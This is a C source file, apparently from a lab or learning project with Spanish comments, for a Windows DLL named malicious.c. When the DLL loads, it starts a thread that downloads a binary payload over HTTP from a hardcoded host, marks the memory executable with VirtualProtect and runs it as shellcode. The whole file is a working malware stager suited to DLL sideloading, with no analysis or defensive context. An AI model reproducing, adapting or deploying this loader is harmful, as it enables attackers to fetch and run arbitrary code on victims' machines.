// malicious.c
#define _WIN32_WINNT 0x0601   // <-- AÑADE ESTO (evita warnings raros)
#include <winsock2.h>         // <-- PRIMERO winsock2.h
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>            // <-- AÑADE ESTO (para snprintf)

#define LHOST "172.16.41.1"
#define LPORT 8000
#define PAYLOAD_PATH "/PROUD_SHED.bin"
#define BUFFER_SIZE 4096


// DECLARACIONES ANTICIPADAS
void* DownloaderThread(size_t *payload_size);
void Run(void* payload, size_t payload_size);


BOOL isLoaded = FALSE;

DWORD WINAPI SafeStartupThread(LPVOID param)
{
    if (!isLoaded)
    {
        isLoaded = TRUE;
        printf("[Dll] SafeStartupThread");


        size_t payload_size;
        void* payload = DownloaderThread(&payload_size);
        printf("[+] Payload size: %d, en la direccion %p\n", payload_size, payload);

        Run(payload, payload_size);

    }

    return 0;
}


void* DownloaderThread(size_t *payload_size) {
    
    printf("[+] DownloaderThread iniciado\n");
    
    // ------------------------------------------------------------
    // Iniciar Winsock y crear el socket
    WSADATA wsa;
    SOCKET sock = INVALID_SOCKET;

    printf("[*] Inicializando Winsock...\n");
    if (WSAStartup(MAKEWORD(2,2), &wsa) != 0) { 
        printf("[!] Error: WSAStartup falló\n"); 
        goto cleanup; 
    }
    
    printf("[*] Creando socket...\n");
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) { 
        printf("[!] Error: socket() falló\n"); 
        goto cleanup; 
    }

    // ------------------------------------------------------------
    // Configurar Servidor 
    struct sockaddr_in server;
    memset(&server, 0, sizeof(server));
    server.sin_family = AF_INET;
    server.sin_port = htons(LPORT);

    printf("[*] Configurando servidor: %s:%d\n", LHOST, LPORT);

    if (inet_pton(AF_INET, LHOST, &server.sin_addr) != 1) { 
        printf("[!] Error: inet_pton() falló\n"); 
        goto cleanup; 
    }

    printf("[*] Conectando al servidor...\n");
    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
        printf("[!] Error: connect() falló\n");
        goto cleanup;
    }
    printf("[+] Conexion establecida\n");

    // ------------------------------------------------------------
    // Crear y enviar peticion HTTP 
    char request[512];
    printf("[*] Construyendo peticion HTTP GET a %s%s ...\n", LHOST, PAYLOAD_PATH);

    int req_len = snprintf(
        request, 
        sizeof(request),
        "GET %s HTTP/1.0\r\nHost: %s\r\n\r\n", PAYLOAD_PATH, LHOST
    );

    if (req_len <= 0 || req_len >= sizeof(request)) { 
        printf("[!] Error: snprintf() falló al construir la petición\n"); 
        goto cleanup; 
    }
    
    printf("[*] Enviando peticion HTTP (%d bytes)...\n", req_len);
    if (send(sock, request, req_len, 0) == SOCKET_ERROR) { 
        printf("[!] Error: send() fallo\n"); 
        goto cleanup; 
    }

    // ------------------------------------------------------------
    // Recibir datos
    char buffer[BUFFER_SIZE];
    size_t size = 0;
    int bytes;
    unsigned char *data = NULL;

    printf("[*] Descargando respuesta...\n");

    while ((bytes = recv(sock, buffer, BUFFER_SIZE, 0)) > 0) {

        unsigned char *tmp = realloc(data, size + bytes);
        if (!tmp) { 
            printf("[!] Error: realloc() fallo\n"); 
            goto cleanup; 
        }

        data = tmp;
        memcpy(data + size, buffer, bytes);
        size += bytes;
    }

    if (bytes == SOCKET_ERROR) { 
        printf("[!] Error: recv() fallo\n"); 
        goto cleanup; 
    }

    printf("[+] Descarga completa: %zu bytes totales\n", size);

    // ------------------------------------------------------------
    // Separar headers y body
    unsigned char *body = data;
    size_t body_size = size;

    printf("[*] Buscando separador de headers...\n");

    const char *header_end = strstr((char *)data, "\r\n\r\n");

    if (header_end != NULL) {
        printf("[+] Headers encontrados. Offset: %ld bytes\n", (long)(header_end - (char*)data));
        body = (unsigned char *)(header_end + 4);
        body_size = size - (size_t)(body - data);
    } else {
        printf("[!] No se encontraron headers. Usando todo el contenido como body.\n");
    }

    printf("[+] Body size: %zu bytes\n", body_size);

    *payload_size = body_size;
    return body;

cleanup:
    printf("[*] Ejecutando cleanup...\n");
    if (data) { printf("[*] Liberando buffer...\n"); free(data); }
    if (sock != INVALID_SOCKET) { printf("[*] Cerrando socket...\n"); closesocket(sock); }
    WSACleanup();
    printf("[*] Cleanup completo\n");

    return 0;
}

void Run(void* payload, size_t payload_size){
    printf("[+] RunWithProtect \n");

    DWORD oldProtect;
    if (VirtualProtect(payload, payload_size, PAGE_EXECUTE_READWRITE, &oldProtect)) {

        // Los permisos tienen que ser RWE sino hay un fallo de segmento 
        printf("[+] Permisos cambiados exitosamente: 0x%lx -> 0x%lx\n", oldProtect, PAGE_EXECUTE_READWRITE);

        HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)payload, NULL, 0, NULL);
        if (hThread) {
            CloseHandle(hThread);
        }
    }
}


BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {

    switch (reason)
    {
        case DLL_PROCESS_ATTACH:
        {
            DisableThreadLibraryCalls(hModule);

            HANDLE hThread = CreateThread(NULL, 0, SafeStartupThread, NULL, 0, NULL);
            
            if (hThread) {CloseHandle(hThread);}        

            break;
        }
    }

    return TRUE;

}